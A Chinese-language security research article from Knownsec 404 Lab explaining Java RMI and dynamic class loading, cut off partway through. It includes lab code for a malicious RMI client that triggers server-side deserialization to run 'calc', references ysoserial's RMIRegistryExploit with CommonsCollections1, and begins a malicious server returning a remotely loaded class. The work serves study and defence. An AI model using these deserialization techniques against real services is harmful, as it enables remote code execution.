**作者：Longofo@知道创宇404实验室**  
**时间：2019年11月4日**
之前看了SHIRO-721这个漏洞，然后这个漏洞和SHIRO-550有些关联，在SHIRO-550的利用方式中又看到了利用ysoserial中的JRMP
exploit，然后又想起了RMI、JNDI、LDAP、JMX、JMS这些词。这些东西也看到了几次，也看过对应的文章，但把他们联想在一起时这些概念又好像交叉了一样容易混淆。网上的一些资料也比较零散与混乱，所以即使以前看过，没有放在一起看的话很容易混淆。下面是对RMI、JNDI、LDAP、JRMP、JMX、JMS一些资料的整理。
**注** ：这篇先写了RMI、JNDI、LDAP的内容，JRMP、JMX、JMS下篇再继续。文章很长，阅读需要些耐心。
### 测试环境说明
  * 文中的测试代码放到了[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上
  * 测试代码的JDK版本在文中会具体说明，有的代码会被重复使用，对应的JDK版本需要自己切换
### RMI
在看下以下内容之前，可以阅读下[这篇文章](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)[1]，里面包括了Java RMI相关的介绍，包括对Java
RMI的简介、远程对象与非远程对象的区别、Stubs与skeletons、远程接口、UnicastRemoteObject类、RMI注册表、RMI动态加载等内容。
#### Java RMI
远程方法调用是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，例如CORBA、WebService，这两种是独立于编程语言的。而Java
RMI是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法并获取执行结果，使分布在不同的JVM中的对象的外表和行为都像本地对象一样。
在[这篇文章](https://paper.seebug.org/1012/)[2]中，作者举了一个例子来描述RMI：
假设A公司是某个行业的翘楚，开发了一系列行业上领先的软件。B公司想利用A公司的行业优势进行一些数据上的交换和处理。但A公司不可能把其全部软件都部署到B公司，也不能给B公司全部数据的访问权限。于是A公司在现有的软件结构体系不变的前提下开发了一些RMI方法。B公司调用A公司的RMI方法来实现对A公司数据的访问和操作，而所有数据和权限都在A公司的控制范围内，不用担心B公司窃取其数据或者商业机密。
对于开发者来说，远程方法调用就像我们本地调用一个对象的方法一样，他们很多时候不需要关心内部如何实现，只关心传递相应的参数并获取结果就行了。但是对于攻击者来说，要执行攻击还是需要了解一些细节的。
**注** ：这里我在RMI前面加上了Java是为了和Weblogic
RMI区分。Java本身对RMI规范的实现默认使用的是JRMP协议，而Weblogic对RMI规范的实现使用T3协议，Weblogic之所以开发T3协议，是因为他们需要可扩展，高效的协议来使用Java构建企业级的分布式对象系统。
**JRMP** ：Java Remote Message Protocol ，Java 远程消息交换协议。这是运行在Java
RMI之下、TCP/IP之上的线路层协议。该协议要求服务端与客户端都为Java编写，就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。
##### Java RMI远程方法调用过程
**几个tips** ：
  1. RMI的传输是基于反序列化的。
  2. 对于任何一个以对象为参数的RMI接口，你都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath（不在classpath的情况，可以看后面RMI动态加载类相关部分）中的可序列化类来反序列化恢复对象。 
使用远程方法调用，会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现
java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。
在JVM之间通信时，RMI对远程对象和非远程对象的处理方式是不一样的，它并没有直接把远程对象复制一份传递给客户端，而是传递了一个远程对象的Stub，Stub基本上相当于是远程对象的引用或者代理（Java
RMI使用到了代理模式）。Stub对开发者是透明的，客户端可以像调用本地方法一样直接通过它来调用远程方法。Stub中包含了远程对象的定位信息，如Socket端口、服务端主机地址等等，并实现了远程调用过程中具体的底层网络通信细节，所以RMI远程调用逻辑是这样的：
从逻辑上来说，数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的：
  1. Server端监听一个端口，这个端口是JVM随机选择的；
  2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；
  3. Client端可以调用Stub上的方法；
  4. Stub连接到Server端监听的通信端口并提交参数；
  5. 远程Server端上执行具体的方法，并返回结果给Stub；
  6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样；
**怎么获取Stub呢？**
假设Stub可以通过调用某个远程服务上的方法向远程服务来获取，但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。
使用RMI Registry之后，RMI的调用关系应该是这样的：
所以从客户端角度看，服务端应用是有两个端口的，一个是RMI
Registry端口（默认为1099），另一个是远程对象的通信端口（随机分配的），通常我们只需要知道Registry的端口就行了，Server的端口包含在了Stub中。RMI
Registry可以和Server端在一台服务器上，也可以在另一台服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。
##### 模拟Java RMI利用
我们使用下面的例子来模拟Java RMI的调用过程并执行攻击：
1.创建服务端对象类，先创建一个接口继承`java.rmi.Remote`
    //Services.java
    package com.longofo.javarmi;
    import java.rmi.RemoteException;
    public interface Services extends java.rmi.Remote {
         String sendMessage(Message msg) throws RemoteException;
    }
2.创建服务端对象类，实现这个接口
       //ServicesImpl.java
       package com.longofo.javarmi;
       import java.rmi.RemoteException;
       public class ServicesImpl implements Services {
           public ServicesImpl() throws RemoteException {
           }
           @Override
           public String sendMessage(Message msg) throws RemoteException {
               return msg.getMessage();
           }
       }
3.创建服务端远程对象骨架skeleton并绑定在Registry上
       //RMIServer.java
       package com.longofo.javarmi;
       import java.rmi.RMISecurityManager;
       import java.rmi.RemoteException;
       import java.rmi.registry.LocateRegistry;
       import java.rmi.registry.Registry;
       import java.rmi.server.UnicastRemoteObject;
       public class RMIServer {
           /**
            * Java RMI 服务端
            *
            * @param args
            */
           public static void main(String[] args) {
               try {
                   // 实例化服务端远程对象
                   ServicesImpl obj = new ServicesImpl();
                   // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
                   Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
                   Registry reg;
                   try {
                       //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
                       System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
                       RMISecurityManager securityManager = new RMISecurityManager();
                       System.setSecurityManager(securityManager);
                       // 创建Registry
                       reg = LocateRegistry.createRegistry(9999);
                       System.out.println("java RMI registry created. port on 9999...");
                   } catch (Exception e) {
                       System.out.println("Using existing registry");
                       reg = LocateRegistry.getRegistry();
                   }
                   //绑定远程对象到Registry
                   reg.rebind("Services", services);
               } catch (RemoteException e) {
                   e.printStackTrace();
               }
           }
       }
4.创建恶意客户端
       package com.longofo.javarmi;
       import java.rmi.registry.LocateRegistry;
       import java.rmi.registry.Registry;
       public class RMIClient {
           /**
            * Java RMI恶意利用demo
            *
            * @param args
            * @throws Exception
            */
           public static void main(String[] args) throws Exception {
               Registry registry = LocateRegistry.getRegistry();
               // 获取远程对象的引用
               Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
               PublicKnown malicious = new PublicKnown();
               malicious.setParam("calc");
               malicious.setMessage("haha");
               // 使用远程对象的引用调用对应的方法
               System.out.println(services.sendMessage(malicious));
           }
       }
上面这个例子是在[CVE-2017-3241分析](https://www.freebuf.com/vuls/126499.html)[3]中提供代码基础上做了一些修改，完整的测试代码已经放到[github](https://github.com/longofo/rmi-jndi-ldap-jrmp-jmx-jms)上了，先启动RMI Server端`java-rmi-server/src/main/java/com/longofo/javarmi/RMIServer`，在启动RMI客户端`java-rmi-client/src/main/java/com/longofo/javarmi/RMIClient`就可以复现，在JDK 1.6.0_29测试通过。
在ysoserial中的RMIRegistryExploit提供另一种思路，利用其他客户端也能向服务端的Registry注册远程对象的功能，由于对象绑定时也传递了序列化的数据，在Registry端（通常和服务端在同一服务器且处于同一JVM下）会对数据进行反序列化处理，RMIRegistryExploit中使用的CommonsCollections1这个payload，如果Registry端也存在CommonsCollections1这个payload使用到的类就能恶意利用。对于一些CommonsCollections1利用不了的情况，例如CommonsCollections1中相关利用类被过滤拦截了，也还有其他例如结合JRMP方式进行利用的方法，可以参考下这位作者的[思路](http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/)。
**这里还需要注意这时Server端是作为RMI的服务端而成为受害者，在后面的RMI动态类加载或JNDI注入中可以看到Server端也可以作为RMI客户端成为受害者**
。
上面的代码假设RMIServer就是提供Java RMI远程方法调用服务的厂商，他提供了一个Services接口供远程调用；
在客户端中，正常调用应该是`stub.sendMessage(Message)`，这个参数应该是Message类对象的，但是我们知道服务端存在一个公共的已知PublicKnown类（比如经典的Apache
Common
Collection，这里只是用PublicKnown做一个类比），它有readObject方法并且在readObject中存在命令执行的能力，所以我们客户端可以写一个与服务端包名，类名相同的类并继承Message类(Message类在客户端服务端都有的)，根据上面两个Tips，在服务端会反序列化传递的数据，然后到达PublicKnown执行命令的地方（这里需要注意的是服务端PublicKnown类的serialVersionUID与客户端的PublicKnown需要保持一致，如果不写在序列化时JVM会自动根据类的属性等生成一个UID，不过有时候自动生成的可能会不一致，不过不一致时，Java
RMI服务端会返回错误，提示服务端相应类的serialVersionUID，在本地类重新加上服务端的serialVersionUID就行了）：
上面这个错误也是从服务端发送过来的，不过不要紧，命令在出现错误之前就执行了。
来看下调用栈，我们在服务端的PublicKnown类中readObject下个断点，
从`sun.rmi.server.UnicastRef`开始调用了readObject，然后一直到调用PublicKnown类的readObject
抓包看下通信的数据：
可以看到PublicKnown类对象确实被序列化传递了，通信过程全程都有被序列化的数据，那么在服务端也肯定会会进行反序列化恢复对象，可以自己抓包看下。
#### Java RMI的动态加载类
**java.rmi.server.codebase**
：`java.rmi.server.codebase`属性值表示一个或多个URL位置，可以从中下载本地找不到的类，相当于一个代码库。代码库定义为将类加载到虚拟机的源或场所，可以将`CLASSPATH`视为“本地代码库”，因为它是磁盘上加载本地类的位置的列表。就像`CLASSPATH`"本地代码库"一样，小程序和远程对象使用的代码库可以被视为"远程代码库"。
RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的class文件可以使用http://、ftp://、file://进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些
**子类**
中被重写的方法，客户端就需要从服务端提供的`java.rmi.server.codebase`URL去加载类；对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的
**子类**
，那么服务端需要从客户端提供的`java.rmi.server.codebase`URL去加载对应的类。客户端与服务端两边的`java.rmi.server.codebase`URL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：
  1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
  2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
**注** ：在JNDI注入的利用方法中也借助了这种动态加载类的思路。
##### 远程方法返回对象为远程接口方法返回对象的子类（目标Server端为RMI客户端时的恶意利用）
远程对象象接口（这个接口一般都是公开的）：
    //Services.java
    package com.longofo.javarmi;
    import java.rmi.RemoteException;
    public interface Services extends java.rmi.Remote {
        Object sendMessage(Message msg) throws RemoteException;
    }
恶意的远程对象类的实现：
    package com.longofo.javarmi;
    import com.longofo.remoteclass.ExportObject;
    import java.rmi.RemoteException;
    public class ServicesImpl1 implements Services {
        @Override
        //这里在服务端将返回值设置为了远程对象接口Object的子类，这个ExportObject在客户端是不存在的
        public ExportObject sendMessage(Message msg) throws RemoteException {
            return new ExportObject();